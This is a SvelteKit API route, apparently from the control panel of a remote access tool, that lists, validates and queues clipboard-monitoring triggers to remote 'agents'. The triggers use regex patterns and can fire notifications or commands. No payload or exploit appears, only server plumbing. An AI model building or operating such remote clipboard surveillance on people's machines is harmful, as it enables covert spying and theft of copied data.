import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { clipboardManager } from '$lib/server/rat/clipboard';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import type {
	ClipboardCommandPayload,
	ClipboardFormat,
	ClipboardTrigger,
	ClipboardTriggerAction,
	ClipboardTriggerCondition
} from '$lib/types/clipboard';

interface TriggerUpdateRequest {
	triggers: ClipboardTriggerInput[];
}

interface ClipboardTriggerInput {
	id?: string;
	label?: string;
	description?: string;
	condition?: Partial<ClipboardTriggerCondition>;
	action?: Partial<ClipboardTriggerAction>;
	createdAt?: string;
	updatedAt?: string;
	active?: boolean;
}

const allowedFormats: ClipboardFormat[] = ['text', 'image', 'files', 'html', 'rtf', 'unknown'];
const allowedActions = new Set<ClipboardTriggerAction['type']>(['notify', 'command']);

function normalizeFormats(input?: ClipboardFormat[]): ClipboardFormat[] | undefined {
	if (!input) return undefined;
	const values = input
		.map((format) => format?.toLowerCase().trim())
		.filter((value): value is ClipboardFormat => allowedFormats.includes(value as ClipboardFormat));
	return values.length > 0 ? Array.from(new Set(values)) : undefined;
}

function normalizeTrigger(input: ClipboardTriggerInput, now: string): ClipboardTrigger {
	const id = input.id?.trim() || randomUUID();
	const label = input.label?.trim() || 'Clipboard trigger';
	const description = input.description?.trim() || undefined;

	const formats = normalizeFormats(input.condition?.formats);
	const pattern = input.condition?.pattern?.trim() || undefined;
	const caseSensitive = Boolean(input.condition?.caseSensitive);

	if (pattern) {
		try {
			new RegExp(pattern, caseSensitive ? undefined : 'i');
		} catch {
			throw error(400, `Invalid trigger pattern for ${label}`);
		}
	}

	const actionType = input.action?.type ?? 'notify';
	if (!allowedActions.has(actionType)) {
		throw error(400, `Unsupported trigger action type: ${actionType}`);
	}

	const action: ClipboardTriggerAction = {
		type: actionType,
		configuration:
			input.action?.configuration && typeof input.action.configuration === 'object'
				? input.action.configuration
				: undefined
	};

	return {
		id,
		label,
		description,
		condition: {
			formats,
			pattern,
			caseSensitive
		},
		action,
		active: typeof input.active === 'boolean' ? input.active : true,
		createdAt: input.createdAt ?? now,
		updatedAt: now
	} satisfies ClipboardTrigger;
}

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	const triggers = clipboardManager.listTriggers(id);
	return json({ triggers });
};

export const PUT: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let payload: TriggerUpdateRequest;
	try {
		payload = (await request.json()) as TriggerUpdateRequest;
	} catch {
		throw error(400, 'Invalid trigger payload');
	}

	if (!payload?.triggers || !Array.isArray(payload.triggers)) {
		throw error(400, 'Triggers payload must be an array');
	}

	const now = new Date().toISOString();
	const normalized = payload.triggers.map((trigger) => normalizeTrigger(trigger, now));

	clipboardManager.setTriggers(id, normalized);

	try {
		const command: ClipboardCommandPayload = { action: 'sync-triggers', triggers: normalized };
		registry.queueCommand(id, { name: 'clipboard', payload: command }, { operatorId: user.id });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue trigger synchronization');
	}

	return json({ triggers: normalized });
};
